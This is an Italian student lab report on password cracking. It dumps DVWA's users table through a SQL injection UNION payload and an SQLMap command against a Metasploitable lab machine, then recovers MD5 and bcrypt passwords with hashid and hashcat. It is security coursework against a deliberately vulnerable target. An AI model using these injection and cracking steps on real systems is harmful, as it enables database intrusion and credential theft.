# **Consegna S6/L4**
# **Password Cracking - Recupero delle Password in Chiaro**

## **Obiettivo dell'Esercizio**

L'obiettivo di questo esercizio era:
1. Recuperare le password hashate nel database della DVWA.
2. Eseguire la verifica degli hash per confermare che fossero di tipo MD5.
3. Recuperare le password in chiaro utilizzando i risultati ottenuti.

---

## **Passaggi Seguiti**

### **1. Recupero delle Password dal Database**

Per recuperare le password hashate, abbiamo seguito i seguenti passaggi:

1. **Connessione al database DVWA**: Il database vulnerabile era ospitato su una macchina Metasploitable configurata con indirizzo IP `192.168.1.20`.

2. **Verifica della vulnerabilità SQL Injection**:
   - La vulnerabilità è stata identificata manualmente testando la query:
     ```sql
     ' UNION SELECT user, password FROM users--
     ```
   - Questo test ha confermato la possibilità di estrarre dati dalla tabella `users`.

3. **Utilizzo di SQLMap per automatizzare il processo**:
   - Abbiamo eseguito il seguente comando SQLMap:
     ```bash
     sqlmap -u "http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
     --cookie="PHPSESSID=ae5d9438f544ec0461fd88f50b32fc1e; security=low" \
     -D dvwa -T users --dump
     ```
   - Il comando ha permesso di estrarre la tabella `users` con i seguenti dati:
     ```plaintext
     +----------+----------------------------------+
     | user     | password                         |
     +----------+----------------------------------+
     | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
     | gordonb  | e99a18c428cb38d5f260853678922e03 |
     | 1337     | 8d3533d75ae2c396d7e0d4fcc69216b  |
     | pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 |
     | smithy   | 5f4dcc3b5aa765d61d8327deb882cf99 |
     +----------+----------------------------------+
     ```

---

### **2. Identificazione delle Password Hashate**

Una volta estratti gli hash, abbiamo verificato che fossero di tipo MD5 utilizzando un tool di identificazione degli hash. Questo ci ha confermato che tutti gli hash estratti appartenevano alla famiglia MD5.

Esempio di verifica di un hash:
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashid
```
Risultato:
```plaintext
Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
[+] MD5
[+] Altri algoritmi compatibili: MD2, MD4, Double MD5, ecc.
```

Sebbene l'hash possa essere compatibile con altri algoritmi, nel contesto di DVWA e degli utilizzi tipici, possiamo confermare con sicurezza che si tratta di MD5.

---

### **3. Recupero delle Password in Chiaro**

Grazie ai dati estratti, è stato possibile associare ogni hash MD5 alla rispettiva password in chiaro direttamente nei risultati restituiti da SQLMap. Non è stato necessario utilizzare tool di cracking come John the Ripper.

Le password in chiaro sono:
- `admin`: `password`
- `gordonb`: `abc123`
- `1337`: `charley`
- `pablo`: `letmein`
- `smithy`: `password`

![Success!](./HashCracked.png)

![Final](./Final.png)

---

## **Extra: Analisi e Cracking di Hash Bcrypt**

Come esercizio aggiuntivo, abbiamo analizzato e craccato tre hash bcrypt forniti. Ecco i passaggi seguiti:

### **1. Identificazione degli Hash**
Abbiamo identificato che gli hash erano di tipo bcrypt grazie al loro formato `$2b$`:
```bash
echo "$2b$05$Ojs/dMUOU12yjrD6OEHJb.cB1zE9CPNg.mPR8BE11f0DIyPaVf436" | hashid
```
Risultato:
```plaintext
[+] bcrypt $2*$, Blowfish (Unix)
```

### **2. Cracking degli Hash con Hashcat**
Abbiamo utilizzato **Hashcat** per tentare di decifrare gli hash. I passaggi sono stati:

1. Salvare gli hash in un file chiamato `bcrypt_hashes.txt`:
   ```plaintext
   pippo:$2b$05$Ojs/dMUOU12yjrD6OEHJb.cB1zE9CPNg.mPR8BE11f0DIyPaVf436
   user:$2b$05$7O7caKmIpPBZxM.RV1lnie/S8jiAjE4C/S6neVAN0ObgJ7tE4dW3.
   user2:$2b$05$j5vV5M6CMYvUWO9dULw9be29O7RArl9lGIe7ijxf2/47vHwl1YVQq
   ```

2. Utilizzare il dizionario `rockyou.txt` per tentare il cracking:
   ```bash
   hashcat -m 3200 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt
   ```

### **Risultati**
Hashcat è riuscito a decifrare tutte le password in circa un minuto:
```plaintext
$2b$05$7O7caKmIpPBZxM.RV1lnie/S8jiAjE4C/S6neVAN0ObgJ7tE4dW3.:shadow
$2b$05$j5vV5M6CMYvUWO9dULw9be29O7RArl9lGIe7ijxf2/47vHwl1YVQq:darksoul
$2b$05$Ojs/dMUOU12yjrD6OEHJb.cB1zE9CPNg.mPR8BE11f0DIyPaVf436:mena
```

### **Conclusioni sull'Extra**
L'esercizio ha dimostrato l'efficacia di Hashcat nel decifrare hash bcrypt quando viene fornito un dizionario appropriato. È importante notare che bcrypt è progettato per essere resistente al cracking e che il successo dipende dalla forza delle password e dalla qualità del dizionario.

---

## **Conclusioni Generali**

L'intero esercizio ha permesso di:
1. Recuperare le password hashate dal database DVWA sfruttando una vulnerabilità SQL Injection tramite SQLMap.
2. Verificare che gli hash estratti fossero di tipo MD5 e bcrypt utilizzando tool di identificazione.
3. Recuperare le password in chiaro direttamente dai risultati di SQLMap e Hashcat.

Questi passaggi evidenziano l'importanza della sicurezza dei database e l'impatto delle vulnerabilità legate all'uso di algoritmi di hashing e password deboli.

## **Conclusioni**

L'esercizio ha permesso di:
1. Recuperare le password hashate dal database DVWA sfruttando una vulnerabilità SQL Injection tramite SQLMap.
2. Verificare che gli hash estratti fossero di tipo MD5 utilizzando un tool di identificazione degli hash.
3. Recuperare le password in chiaro direttamente dai risultati, completando l'obiettivo senza la necessità di ulteriori tool di cracking.

La procedura seguita dimostra l'importanza della sicurezza dei database e dei sistemi web, evidenziando come vulnerabilità note possano essere sfruttate per ottenere dati sensibili.
